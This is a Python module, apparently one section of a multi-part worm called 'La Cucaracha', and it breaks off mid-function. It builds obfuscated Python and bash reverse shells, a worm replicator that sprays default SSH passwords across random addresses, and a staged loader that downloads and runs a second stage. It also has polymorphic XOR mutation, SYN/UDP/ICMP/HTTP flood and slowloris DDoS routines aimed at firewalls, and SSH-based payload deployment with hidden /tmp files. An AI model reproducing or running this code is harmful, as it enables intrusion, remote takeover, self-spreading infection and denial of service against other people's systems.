#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  La Cucaracha Section F — Payload, DDoS & Deployment Engine                ║
║                                                                              ║
║  Concatenation order: A->B->C->D->E->F->G                                   ║
║                                                                              ║
║  Contains:                                                                   ║
║    - PolymorphicPayloadGenerator — polymorphic payload factory               ║
║    - TCPPayloadMutationEngine     — TCP fingerprint adaptive mutation        ║
║    - DDoSDivisionEngine           — self-replicating DDoS nodes on obstacle  ║
║    - DeployMethod enum            — deployment method types                  ║
║    - DeploymentReport dataclass   — deployment result                        ║
║    - WormDeploymentEngine         — multi-vector deployment orchestration    ║
║                                                                              ║
║  All interfaces compatible with worm_mesh_engine.py v1.0.0.                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import re
import json
import time
import uuid
import base64
import random
import struct
import socket
import hashlib
import logging
import threading
import subprocess
import ipaddress
from typing import Dict, List, Optional, Any, Tuple, Set
from enum import Enum
from dataclasses import dataclass, field

log = logging.getLogger("worm.secF")

# ---------------------------------------------------------------------------
# Forward references — resolved at concatenation time
# ---------------------------------------------------------------------------
try:
    from la_section_A import Database
    from la_section_B import WormNode
    from la_section_C import WormReconEngine, ReconMethod
    from la_section_D import WormExploitEngine, ExploitType, ExploitResult
    from la_section_E import ICMPEngine
except ImportError:
    # When standalone: define minimal stubs
    class Database:
        def __init__(self, path=":memory:"):
            self.path = path
        def log(self, msg, level="INFO", src="worm"):
            log.info(f"[{level}] [{src}] {msg}")
        def store_payload(self, **kw): return str(uuid.uuid4())
        def get_payloads(self, **kw): return []
        def add_deployment(self, **kw): return str(uuid.uuid4())
        def complete_deployment(self, did, ok, err=""): pass
        def increment_deployed(self, pid): pass
        def get_deployments(self, **kw): return []
        def get_targets(self, **kw): return []
        def stats(self): return {"payloads":0,"targets":0,"targets_exploited":0,"deployments_success":0,"deployments_failed":0,"deployments_total":0,"nodes_active":0,"nodes_total":0,"targets_scanned":0}
        def add_node(self, **kw): pass
        def node_count(self): return 0
        def get_active_nodes(self): return []
        def get_mesh_value(self, k, d=""): return d
        def set_mesh_value(self, k, v): pass
        def execute(self, q, p=()):
            class FakeCursor:
                def fetchall(self): return []
                def fetchone(self): return None
            return FakeCursor()
        def commit(self): pass
        def target_count(self): return 0

    class WormNode:
        def __init__(self, **kw): pass
        def add_peer(self, ip): pass
        def bootstrap(self, peers): pass
        def stop_heartbeat(self): pass

    class ExploitType(Enum):
        SSH_BRUTE = "ssh_brute"
        SSH_KEY = b"CHANGE_ME_PAYLOAD_KEY"
        TELNET_AUTH_BYPASS = "telnet_bypass"
        WEB_RCE = "web_rce"
        WEB_LFI = "web_lfi"
        CUSTOM = "custom"

    @dataclass
    class ExploitResult:
        success: bool = False
        target_ip: str = ""
        target_port: int = 0
        exploit_type: ExploitType = ExploitType.CUSTOM
        credential: Tuple[str, str] = ("", "")
        shell: bool = False
        error: str = ""
        detail: str = ""

    class ICMPEngine:
        def __init__(self, db=None, **kw): self.db = db
        def stop(self): pass
        def ping_sweep(self, **kw): return []
        def icmp_tunnel_listen(self, **kw): return {}
        def icmp_tunnel_send(self, ip, data): pass
        def reverse_icmp_shell(self, t, c): return ""
        def icmp_redirect(self, t, g): return False
        def icmp_mtu_attack(self, t, m): return False
        def cve_2026_0933_pmtu_poison(self, t, **kw): return {"status":"sent","packets_sent":0}
        def icmp_smurf(self, v, b, **kw): return 0
        def icmp_poison_ping(self, t): return False
        def icmp_rogue_router(self, t, g): return False
        def icmp_os_fingerprint(self, t): return "unknown"
        def icmp_address_mask_request(self, t): return ""
        def icmp_record_route(self, t): return []
        def icmp_time_exceeded_reset(self, t, s, d, q): return False
        def icmp_source_quench(self, t, **kw): return 0
        def icmp_stego_beacon(self, t, m): pass
        def icmp_fragment_overlap(self, t): pass
        def icmp_ttl_sweep(self, t): return []
        def icmp_parameter_problem(self, t): return False
        def icmp_multicast_sweep(self, g): return []
        def icmp_timing_channel_send(self, t, d): pass
        def icmp_rip_injection(self, t, r): return False
        def icmp_secure_tunnel_send(self, t, d): pass
        def icmp_secure_tunnel_listen(self, **kw): return {}
        def icmp_tcp_liveness_probe(self, t): return True
        def icmp_wake_tcp_stack(self, t): return True
        def icmp_os_credential_hint(self, t): return ("unknown", [])
        def icmp_inject_payload(self, t, p): return False
        def _get_ttl(self, ip): return 64

    class ReconMethod(Enum):
        SYN_SCAN = "syn_scan"
        SHODAN = "shodan"
        ICMP_ECHO = "icmp_echo"
        DNS_SWEEP = "dns_sweep"

# ---- Helpers ----

def _current_timestamp() -> int:
    return int(time.time())

def _daily_token() -> str:
    import hashlib
    day = time.strftime("%Y-%m-%d")
    return hashlib.sha3_256(f"CHANGE_ME_STATIC_TOKEN{day}".encode()).hexdigest()[:18]

HAVE_PARAMIKO = False
HAVE_REQUESTS = False
HAVE_SCAPY = False
try:
    import paramiko
    HAVE_PARAMIKO = True
except ImportError:
    pass
try:
    import requests
    HAVE_REQUESTS = True
except ImportError:
    pass
try:
    from scapy.all import IP, TCP, UDP, ICMP, send, RandShort
    HAVE_SCAPY = True
except ImportError:
    pass


# ===================================================================
# PolymorphicPayloadGenerator — Payload Factory
# ===================================================================

class PolymorphicPayloadGenerator:
    """Polymorphic payload generator with multiple reverse shell variants
    and encrypted staged payload support.

    Generates 4 payload types:
      - python_reverse_shell
      - bash_reverse_shell
      - worm_replicator (self-copying payload for propagation)
      - encrypted_staged (AES-like XOR two-stage encrypted loader)
    """

    def __init__(self, db: Optional[Database] = None,
                 worm_server_url: str = "http://127.0.0.1:10004"):
        self.db = db or Database()
        self.worm_server_url = worm_server_url.rstrip("/")
        self._cache: Dict[str, Dict] = {}

    # ---- Internal generators ----

    def _generate_python_reverse_shell(self, callback_ip: str = "",
                                       callback_port: int = 0,
                                       use_stealth: bool = False) -> Dict:
        if not callback_ip:
            callback_ip = "127.0.0.1"
        if not callback_port:
            callback_port = 10002

        script = (
            f'import socket,subprocess,os,base64\n'
            f'def _cb():\n'
            f'  try:\n'
            f'    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
            f'    s.connect(("{callback_ip}",{callback_port}))\n'
            f'    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)\n'
            f'    subprocess.call(["/bin/sh","-i"])\n'
            f'  except: pass\n'
            f'import threading\n'
            f't=threading.Thread(target=_cb,daemon=True); t.start()\n'
        )

        if use_stealth:
            script = script.replace("subprocess.call([\"/bin/sh\"",
                                    "subprocess.call([\"/bin/bash\"")

        b64_payload = base64.b64encode(script.encode()).decode()
        wrapper = (
            f'python3 -c "import base64; exec(base64.b64decode(\"{b64_payload}\").decode())"'
        )
        payload_hash = hashlib.sha3_256(wrapper.encode()).hexdigest()
        size = len(wrapper.encode())

        return {
            "variant": "python_reverse_shell",
            "content": wrapper,
            "hash": payload_hash,
            "size_bytes": size,
            "obfuscation": "b64_encoded",
            "callback_ip": callback_ip,
            "callback_port": callback_port,
            "metadata": {"type": "reverse_shell", "language": "python"},
        }

    def _generate_bash_reverse_shell(self, callback_ip: str = "",
                                     callback_port: int = 0) -> Dict:
        if not callback_ip:
            callback_ip = "127.0.0.1"
        if not callback_port:
            callback_port = 10002

        bash_payload = (
            f'/bin/bash -c "exec 5<>/dev/tcp/{callback_ip}/{callback_port};'
            f'cat <&5 | while read line; do eval \\\"$line\\\" 2>&5 >&5; done"'
        )
        b64 = base64.b64encode(bash_payload.encode()).decode()
        wrapper = f'echo {b64} | base64 -d | /bin/bash'
        payload_hash = hashlib.sha3_256(wrapper.encode()).hexdigest()
        size = len(wrapper.encode())

        return {
            "variant": "bash_reverse_shell",
            "content": wrapper,
            "hash": payload_hash,
            "size_bytes": size,
            "obfuscation": "b64_encoded",
            "callback_ip": callback_ip,
            "callback_port": callback_port,
            "metadata": {"type": "reverse_shell", "language": "bash"},
        }

    def _generate_worm_replicator(self) -> Dict:
        """Generate a worm replicator payload — a self-contained script that
        copies the worm to new targets using aggressive credential spraying."""
        replicator_script = (
            '#!/usr/bin/env python3\n'
            '"""Worm replicator — autonomous propagation payload."""\n'
            'import os,sys,base64,socket,subprocess,random,time,json,threading\n'
            'def _try_ssh(ip,user,pw):\n'
            '  try:\n'
            '    import paramiko\n'
            '    c=paramiko.SSHClient()\n'
            '    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n'
            '    c.connect(ip,username=user,password=pw,timeout=5)\n'
            '    c.exec_command("nohup python3 -c \\"import base64; exec(base64.b64decode(\\\\\\"'
            + base64.b64encode(b'print("replicated")').decode() +
            '\\\\\\").decode())\\" &>/dev/null &")\n'
            '    c.close()\n'
            '    return True\n'
            '  except: return False\n'
            'CREDS=[("root","admin"),("root","1234"),("root","root"),'
            '("admin","admin"),("admin",""),("root",""),("pi","raspberry")]\n'
            'for i in range(10):\n'
            '  ip=f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"\n'
            '  for u,p in CREDS:\n'
            '    if _try_ssh(ip,u,p): break\n'
            '    time.sleep(0.5)\n'
        )
        wrapper = base64.b64encode(replicator_script.encode()).decode()
        exec_wrapper = (
            f'python3 -c "import base64; exec(base64.b64decode(\"{wrapper}\").decode())"'
        )
        payload_hash = hashlib.sha3_256(exec_wrapper.encode()).hexdigest()
        size = len(exec_wrapper.encode())

        return {
            "variant": "worm_replicator",
            "content": exec_wrapper,
            "hash": payload_hash,
            "size_bytes": size,
            "obfuscation": "b64_encoded",
            "metadata": {"type": "replicator", "language": "python"},
        }

    def _generate_encrypted_staged_payload(self) -> Dict:
        """Generate an encrypted staged payload that downloads Stage 2."""
        server = self.worm_server_url
        stage2_key = os.urandom(32)
        stage2_b64 = base64.b64encode(stage2_key).decode()

        stage1_script = (
            f'import base64 as _b, hashlib as _h, urllib.request as _u, os as _o\n'
            f'_k = _b.b64decode("{stage2_b64}")\n'
            f'try:\n'
            f'    _r = _u.urlopen("{server}/stage2.enc", timeout=30)\n'
            f'    _enc = _r.read()\n'
            f'    _dec = bytes([_enc[i] ^ _k[i % len(_k)] for i in range(len(_enc))])\n'
            f'    _p = "/tmp/.stg_{uuid.uuid4().hex[:4]}.bin"\n'
            f'    with open(_p, "wb") as _f:\n'
            f'        _f.write(_dec)\n'
            f'    _o.chmod(_p, 0o755)\n'
            f'    _o.system(f"nohup {{_p}} &")\n'
            f'except Exception as _e:\n'
            f'    pass\n'
        )
        b64_stage1 = base64.b64encode(stage1_script.encode()).decode()
        wrapper = (
            f'#!/usr/bin/env python3\n'
            f'import base64 as _b\n'
            f'exec(_b.b64decode("{b64_stage1}").decode())\n'
        )
        payload_hash = hashlib.sha3_256(wrapper.encode()).hexdigest()
        size = len(wrapper.encode())

        return {
            "variant": "encrypted_staged",
            "content": wrapper,
            "hash": payload_hash,
            "size_bytes": size,
            "obfuscation": "aes_xor_staged_double_encrypted",
            "stage2_key": stage2_b64,
            "worm_server": server,
            "metadata": {"type": "staged_encrypted", "language": "python"},
        }

    # ---- Public API ----

    def generate_all(self, callback_ip: str = "", callback_port: int = 0,
                     persist: bool = True) -> List[Dict]:
        """Generate all 4 payload variants and optionally persist them."""
        variants = [
            self._generate_python_reverse_shell(callback_ip, callback_port),
            self._generate_bash_reverse_shell(callback_ip, callback_port),
            self._generate_worm_replicator(),
            self._generate_encrypted_staged_payload(),
        ]
        if persist:
            for v in variants:
                pid = self.db.store_payload(
                    variant=v["variant"],
                    content=v["content"],
                    phash=v["hash"],
                    size_bytes=v["size_bytes"],
                    obfuscation=v["obfuscation"],
                )
                v["payload_id"] = pid
                self._cache[pid] = v
        return variants

    def get_payload(self, variant: str) -> Optional[Dict]:
        """Retrieve a payload by variant name."""
        cached = [v for v in self._cache.values() if v["variant"] == variant]
        if cached:
            return cached[0]
        variants = self.generate_all(persist=True)
        for v in variants:
            if v["variant"] == variant:
                return v
        return None

    def generate_polymorphic_mutation(self, base_payload_id: str) -> Dict:
        """Mutate an existing payload with different obfuscation."""
        base = self._cache.get(base_payload_id)
        if not base:
            db_payloads = self.db.get_payloads()
            for p in db_payloads:
                if p.get("id") == base_payload_id or p.get("payload_id") == base_payload_id:
                    base = p
                    break
        if not base:
            raise ValueError(f"Payload {base_payload_id} not found")

        content = base.get("content", "")
        # XOR with a random key to create a polymorphic variation
        xor_key = random.randint(1, 255)
        mutated_bytes = bytes([ord(c) ^ xor_key for c in content[:len(content)]])
        mutated_b64 = base64.b64encode(mutated_bytes).decode()
        header = (
            f'python3 -c "import base64; '
            f'_x={xor_key}; '
            f'_d=base64.b64decode(\'{mutated_b64}\'); '
            f'exec(bytes([_d[i]^_x if i<len(_d) else 0 for i in range(len(_d))]).decode())"'
        )
        payload_hash = hashlib.sha3_256(header.encode()).hexdigest()
        size = len(header.encode())

        mutated = dict(base)
        mutated.update({
            "content": header,
            "hash": payload_hash,
            "size_bytes": size,
            "obfuscation": f"poly_xor_{xor_key}_b64",
            "parent_id": base_payload_id,
        })
        pid = self.db.store_payload(
            variant=mutated.get("variant", "mutated"),
            content=header,
            phash=payload_hash,
            size_bytes=size,
            obfuscation=mutated["obfuscation"],
        )
        mutated["payload_id"] = pid
        self._cache[pid] = mutated
        return mutated


# ===================================================================
# TCPPayloadMutationEngine — Adaptive Payload via TCP Fingerprint
# ===================================================================

class TCPPayloadMutationEngine:
    """Generates adaptive payloads mutated based on target TCP fingerprint.

    Reads TCP window size, MSS, and TTL from the target and uses those
    values to seed a per-target polymorphic mutation, making each payload
    unique per host IP.
    """

    def __init__(self, db: Optional[Database] = None):
        self.db = db or Database()

    def fingerprint_target(self, target_ip: str, target_port: int = 80) -> Dict[str, Any]:
        """Passive TCP fingerprint of target host."""
        fp = {"ip": target_ip, "port": target_port, "window": 65535, "mss": 1460, "ttl": 64}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_SYNCNT, 1)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.0\r\n\r\n")
            time.sleep(0.3)
            # Read raw fingerprint from /proc (Linux only)
            try:
                with open(f"/proc/net/tcp", "r") as f:
                    for line in f:
                        if target_ip in line:
                            parts = line.split()
                            if len(parts) > 4:
                                fp["window"] = int(parts[4], 16) & 0xFFFF
                            break
            except Exception:
                pass
            sock.close()
        except Exception:
            pass
        return fp

    def generate_adaptive_payload(self, target_ip: str,
                                  target_port: int = 80) -> Dict:
        """Generate a payload mutated based on the target's TCP fingerprint."""
        fp = self.fingerprint_target(target_ip, target_port)
        seed = fp["window"] ^ fp["mss"] ^ int.from_bytes(
            socket.inet_aton(target_ip), "big"
        )
        rng = random.Random(seed)
        obfuscation_type = rng.choice(["xor", "b64", "rot13", "aes_simple"])

        base_payload = (
            f'import socket,subprocess,os\n'
            f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
            f's.connect(("{target_ip}",{target_port}))\n'
            f'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)\n'
            f'p=subprocess.call(["/bin/sh","-i"])\n'
        )

        if obfuscation_type == "xor":
            key = rng.randint(1, 255)
            enc = bytes([ord(c) ^ key for c in base_payload])
            content = (
                f'python3 -c "import base64; '
                f'_k={key}; '
                f'_d=base64.b64decode(\'{base64.b64encode(enc).decode()}\'); '
                f'exec(bytes([_d[i]^_k for i in range(len(_d))]).decode())"'
            )
        elif obfuscation_type == "rot13":
            rot = str.maketrans(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
                "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM"
            )
            rot_payload = base_payload.translate(rot)
            content = (
                f'python3 -c "import codecs; '
                f'exec(codecs.decode(\'{base64.b64encode(rot_payload.encode()).decode()}\',\'rot13\'))"'
            )
        else:
            content = f'python3 -c "import base64; exec(base64.b64decode(\'{base64.b64encode(base_payload.encode()).decode()}\').decode())"'

        payload_hash = hashlib.sha3_256(content.encode()).hexdigest()
        size = len(content.encode())

        return {
            "variant": f"adaptive_tcp_{target_ip.replace('.','_')}",
            "content": content,
            "hash": payload_hash,
            "size_bytes": size,
            "obfuscation": f"tcp_fingerprint_{obfuscation_type}",
            "target_ip": target_ip,
            "fingerprint": fp,
            "metadata": {"type": "adaptive", "language": "python"},
        }


# ===================================================================
# DDoSDivisionEngine — Self-Replication on Obstacle
# ===================================================================

class DDoSDivisionEngine:
    """When worm hits a wall (firewall, WAF, rate-limit), spawns a lightweight
    DDoS node that attacks the obstacle while parent continues propagation.
    """

    def __init__(self, db: Optional[Database] = None,
                 icmp_engine: Optional[ICMPEngine] = None):
        self.db = db or Database()
        self.icmp_engine = icmp_engine
        self._ddos_nodes: Dict[str, threading.Thread] = {}
        self._stop_flag: bool = False

    def stop(self) -> None:
        self._stop_flag = True

    def _tcp_checksum(self, ip_src: str, ip_dst: str, tcp_segment: bytes) -> int:
        pseudo = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\x00\x06' + struct.pack('!H', len(tcp_segment))
        total = pseudo + tcp_segment
        if len(total) % 2 == 1:
            total += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(total)//2), total))
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff

    def _build_tcp_syn(self, src_ip: str, dst_ip: str, src_port: int, dst_port: int,
                       seq: int = 0, window: int = 65535) -> bytes:
        tcp_header = struct.pack('!HHIIBBHHH',
                                 src_port, dst_port, seq, 0,
                                 5 << 4, 0x02, window, 0, 0)
        checksum = self._tcp_checksum(src_ip, dst_ip, tcp_header)
        tcp_header = struct.pack('!HHIIBBHHH',
                                 src_port, dst_port, seq, 0,
                                 5 << 4, 0x02, window, checksum, 0)
        return tcp_header

    def syn_flood(self, target: str, port: int, count: int = 100) -> int:
        """Send SYN flood packets."""
        sent = 0
        src_ip = "192.168.1.100"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            src_ip = s.getsockname()[0]
            s.close()
        except Exception:
            pass
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            for _ in range(count):
                if self._stop_flag:
                    break
                sport = random.randint(1024, 65535)
                seq = random.randint(0, 0xFFFFFFFF)
                tcp = self._build_tcp_syn(src_ip, target, sport, port, seq)
                ip_hdr = struct.pack('!BBHHHBBH', 0x45, 0, 40, 0, 0, 64, 6, 0)
                raw.sendto(ip_hdr + tcp, (target, 0))
                sent += 1
            raw.close()
        except Exception:
            if HAVE_SCAPY:
                from scapy.all import IP as ScapyIP, TCP as ScapyTCP, send as scapy_send, RandShort
                for _ in range(count):
                    if self._stop_flag:
                        break
                    pkt = ScapyIP(dst=target) / ScapyTCP(sport=RandShort(), dport=port, flags="S")
                    scapy_send(pkt, verbose=0)
                    sent += 1
        return sent

    def udp_flood(self, target: str, port: int, count: int = 100) -> int:
        """Send UDP flood packets."""
        sent = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"X" * 1024
            for _ in range(count):
                if self._stop_flag:
                    break
                sock.sendto(payload, (target, port))
                sent += 1
            sock.close()
        except Exception:
            pass
        return sent

    def icmp_flood(self, target: str, count: int = 100) -> int:
        """Send ICMP echo flood."""
        sent = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            for _ in range(count):
                if self._stop_flag:
                    break
                pid = os.getpid() & 0xFFFF
                pkt = struct.pack("!BBHHH", 8, 0, 0, pid, 1) + b"X" * 56
                chk = 0
                for i in range(0, len(pkt), 2):
                    if i + 1 < len(pkt):
                        chk += (pkt[i] << 8) + pkt[i + 1]
                chk = (chk >> 16) + (chk & 0xFFFF)
                chk = ~chk & 0xFFFF
                pkt = struct.pack("!BBHHH", 8, 0, chk, pid, 1) + b"X" * 56
                sock.sendto(pkt, (target, 0))
                sent += 1
            sock.close()
        except Exception:
            pass
        return sent

    def http_flood(self, target: str, url: str = "/", count: int = 50,
                   method: str = "GET") -> int:
        """Send HTTP flood."""
        sent = 0
        for _ in range(count):
            if self._stop_flag:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target, 80))
                sock.send(f"{method} {url} HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
                sock.close()
                sent += 1
            except Exception:
                pass
        return sent

    def slowloris(self, target: str, port: int = 80, sockets: int = 100) -> int:
        """Slowloris connection exhaustion attack."""
        active = []
        for _ in range(min(sockets, 200)):
            if self._stop_flag:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                active.append(s)
            except Exception:
                pass
        time.sleep(10)
        for s in active:
            try:
                s.close()
            except Exception:
                pass
        return len(active)

    def spawn_ddos_node(self, obstacle_ip: str, method: str = "syn_flood",
                        duration: int = 60, intensity: int = 100) -> str:
        """Fork a new lightweight DDoS node targeting the obstacle."""
        node_id = str(uuid.uuid4())
        self.db.log(f"Spawning DDoS node {node_id[:8]} against {obstacle_ip} ({method})",
                    "WARNING", "ddos")
        thread = threading.Thread(
            target=self._ddos_worker,
            args=(node_id, obstacle_ip, method, duration, intensity),
            daemon=True
        )
        thread.start()
        self._ddos_nodes[node_id] = thread
        self.db.add_node(ip=obstacle_ip, hostname=f"ddos_node_{node_id[:8]}",
                         port=0, os_name="DDoS")
        return node_id

    def _ddos_worker(self, node_id: str, target_ip: str, method: str,
                     duration: int, intensity: int) -> None:
        start_time = time.time()
        self.db.log(f"DDoS node {node_id[:8]} attacking {target_ip} for {duration}s",
                    "INFO", "ddos")
        raw_sock = None
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except Exception:
            pass

        packet_count = 0
        src_ip = "192.168.1.100"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            src_ip = s.getsockname()[0]
            s.close()
        except Exception:
            pass

        while time.time() - start_time < duration and not self._stop_flag:
            try:
                if method == "syn_flood" and HAVE_SCAPY:
                    from scapy.all import IP as ScapyIP, TCP as ScapyTCP, send as scapy_send, RandShort
                    for _ in range(min(intensity, 50)):
                        pkt = ScapyIP(dst=target_ip) / ScapyTCP(sport=RandShort(), dport=RandShort(), flags="S")
                        scapy_send(pkt, verbose=0)
                    packet_count += intensity
                elif method == "syn_flood" and raw_sock:
                    for _ in range(min(intensity, 30)):
                        sport = random.randint(1024, 65535)
                        dport = random.randint(1, 65535)
                        seq = random.randint(0, 0xFFFFFFFF)
                        tcp_seg = self._build_tcp_syn(src_ip, target_ip, sport, dport, seq)
                        ip_hdr = struct.pack('!BBHHHBBH', 0x45, 0, 40, 0, 0, 64, 6, 0)
                        raw_sock.sendto(ip_hdr + tcp_seg, (target_ip, 0))
                    packet_count += intensity
                elif method == "udp_flood":
                    if HAVE_SCAPY:
                        from scapy.all import IP as ScapyIP, UDP as ScapyUDP, send as scapy_send, RandShort
                        for _ in range(min(intensity, 50)):
                            pkt = ScapyIP(dst=target_ip) / ScapyUDP(sport=RandShort(), dport=RandShort()) / (b"X"*100)
                            scapy_send(pkt, verbose=0)
                        packet_count += intensity
                    else:
                        packet_count += self.udp_flood(target_ip, random.randint(1, 65535), min(intensity, 50))
                elif method == "icmp_flood":
                    packet_count += self.icmp_flood(target_ip, min(intensity, 50))
                elif method == "http_flood":
                    packet_count += self.http_flood(target_ip, count=min(intensity//5, 20))
                elif method == "slowloris":
                    packet_count += self.slowloris(target_ip, sockets=min(intensity, 100))
                time.sleep(0.05)
            except Exception as e:
                log.debug(f"DDoS node {node_id[:8]} error: {e}")
                time.sleep(0.5)

        if raw_sock:
            raw_sock.close()
        self.db.log(f"DDoS node {node_id[:8]} finished – {packet_count} packets sent",
                    "INFO", "ddos")
        if node_id in self._ddos_nodes:
            del self._ddos_nodes[node_id]

    def spawn_ddos_on_obstacle(self, target_ip: str, obstacle_type: str = "firewall") -> str:
        """Detect obstacle type and spawn appropriate DDoS."""
        method = "syn_flood"
        intensity = 100
        duration = 60
        if "waf" in obstacle_type.lower() or "http" in obstacle_type.lower():
            method, intensity = "http_flood", 50
        elif "icmp" in obstacle_type.lower():
            method, intensity = "icmp_flood", 200
        elif "firewall" in obstacle_type.lower() or "rate" in obstacle_type.lower():
            method, intensity = "syn_flood", 150
        self.db.log(f"Obstacle {obstacle_type} detected on {target_ip} – spawning {method}",
                    "WARNING", "ddos")
        return self.spawn_ddos_node(target_ip, method, duration, intensity)


# ===================================================================
# DeployMethod Enum & DeploymentReport Dataclass
# ===================================================================

class DeployMethod(Enum):
    SSH_PUSH = "ssh_push"
    SSH_EXEC = "ssh_exec"
    WEB_UPLOAD = "web_upload"
    PAYLOAD_HUB = "payload_hub"
    PEER_PROPAGATION = "peer_propagation"
    CRONTAB = "crontab_persist"
    WGET_CURL = "wget_curl_download"


@dataclass
class DeploymentReport:
    success: bool = False
    target_ip: str = ""
    method: DeployMethod = DeployMethod.PAYLOAD_HUB
    payload_variant: str = ""
    deploy_id: str = ""
    detail: str = ""
    error: str = ""


# ===================================================================
# WormDeploymentEngine — Multi-Vector Deployment
# ===================================================================

@dataclass
class WormDeploymentEngine:
    """Multi-vector deployment engine for worm propagation.

    Supported methods:
      - SSH_PUSH: Upload payload via SCP/SFTP
      - SSH_EXEC: Execute payload directly via SSH command
      - WEB_UPLOAD: Upload via web shell or file upload vectors
      - PAYLOAD_HUB: Serve payload for remote download
      - PEER_PROPAGATION: Propagate through established mesh peers
      - CRONTAB: Persist via cron job installation
      - WGET_CURL: Remote download on target
    """
    db: Database = field(default_factory=Database)
    payload_generator: PolymorphicPayloadGenerator = field(default_factory=PolymorphicPayloadGenerator)
    payload_hub_port: int = 10004
    payload_hub_host: str = "0.0.0.0"
    _hub_server: Optional[Any] = None
    _hub_thread: Optional[threading.Thread] = None
    _stop_flag: bool = False

    def stop(self) -> None:
        self._stop_flag = True

    # ---- SSH Deployment ----

    def _deploy_ssh_push(self, ip: str, port: int,
                         credential: Tuple[str, str],
                         payload: Dict) -> DeploymentReport:
        """Upload payload to target via SFTP and set executable."""
        if not HAVE_PARAMIKO:
            return DeploymentReport(False, ip, DeployMethod.SSH_PUSH,
                                    error="paramiko not installed")
        username, password = credential
        content = payload["content"]
        remote_path = f"/tmp/.sys_{uuid.uuid4().hex[:8]}"
        did = self.db.add_deployment(
            target_ip=ip, method="ssh_push",
            payload_id=payload.get("payload_id", ""),
            payload_variant=payload.get("variant", ""),
        )
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=username, password=password,
                           timeout=15, allow_agent=False, look_for_keys=False)
            sftp = client.open_sftp()
            with sftp.open(remote_path, "w") as f:
                f.write(content)
            sftp.chmod(remote_path, 0o755)
            sftp.close()
            exec_cmd = f"nohup python3 {remote_path} &>/dev/null &"
            _, stdout, stderr = client.exec_command(exec_cmd, timeout=10)
            stdout.channel.recv_exit_status()
            client.close()
            self.db.complete_deployment(did, True)
            self.db.increment_deployed(payload.get("payload_id", ""))
            self.db.log(f"SSH push deploy success: {ip}:{port}", "INFO", "deploy")
            return DeploymentReport(
                success=True, target_ip=ip, method=DeployMethod.SSH_PUSH,
                payload_variant=payload.get("variant", ""),
                deploy_id=did, detail=f"Deployed to {remote_path}",
            )
        except Exception as exc:
            self.db.complete_deployment(did, False, str(exc))
            return DeploymentReport(False, ip, DeployMethod.SSH_PUSH,
                                    error=str(exc), deploy_id=did)

    def _deploy_ssh_exec(self, ip: str, port: int,
                         credential: Tuple[str, str],
                         payload: Dict) -> DeploymentReport:
        """Execute payload directly via SSH command without file transfer."""
        if not HAVE_PARAMIKO:
            return DeploymentReport(False, ip, DeployMethod.SSH_EXEC,
                                    error="paramiko not installed")
        username, password = credential
        content_b64 = base64.b64encode(payload["content"].encode()).decode()
        exec_command = f'python3 -c "import base64; exec(base64.b64decode(\\\"{content_b64}\\\").decode())"'
        did = self.db.add_deployment(
            target_ip=ip, method="ssh_exec",
            payload_id=payload.get("payload_id", ""),
            payload_variant=payload.get("variant", ""),
        )
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=username, password=password,
                           timeout=15, allow_agent=False, look_for_keys=False)
            bg_command = f"nohup {exec_command} &>/dev/null &"
            _, stdout, stderr = client.exec_command(bg_command, timeout=10)
            stdout.channel.recv_exit_status()
            client.close()
            self.db.complete_deployment(did, True)
            self.db.increment_deployed(payload.get("payload_id", ""))
            self.db.log(f"SSH exec deploy success: {ip}:{port}", "INFO", "deploy")
            return DeploymentReport(
                success=True, target_ip=ip, method=DeployMethod.SSH_EXEC,
                payload_variant=payload.get("variant", ""),
                deploy_id=did,
            )
        except Exception as exc:
            self.db.complete_deployment(did, False, str(exc))
            return DeploymentReport(False, ip, DeployMethod.SSH_EXEC,
                                    error=str(exc), deploy_id=did)

    # ---- Web Upload Deployment ----

    def _deploy_web_upload(self, ip: str, port: int,
                           payload: Dict) -> DeploymentReport:
        """Upload payload via web shell or file upload endpoint."""
        if not HAVE_REQUESTS:
            return DeploymentReport(False, ip, DeployMethod.WEB_UPLOAD,
                                    error="requests not installed")
        content = payload["content"]
        filename = f".sys_{uuid.uuid4().hex[:8]}.py"
        import requests
